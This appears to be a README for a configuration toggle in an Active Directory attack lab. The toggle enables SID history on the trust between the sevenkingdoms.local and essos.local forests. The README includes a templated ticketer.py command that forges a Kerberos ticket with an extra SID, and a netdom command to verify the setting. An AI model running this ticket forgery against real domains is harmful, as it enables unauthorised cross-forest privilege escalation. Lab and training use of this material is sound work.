# sid-history

SID history accepted on the forest trust. Sets `trust.sid_history` to `enabled` on a host providing `forest_trust`.

Attack:

On dc01, sevenkingdoms.local accepts SID history from essos.local users (and the reverse on dc03). With control of the partner forest, forge a ticket with an extra SID of the trusting domain (RID > 1000):

    ticketer.py -nthash <partner krbtgt> -domain-sid <partner SID> -domain <partner> -extra-sid <trusting domain SID>-<RID> user

How to verify:

    netdom trust <domain> /d:<partner> /enablesidhistory   # 'SID history is enabled' when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
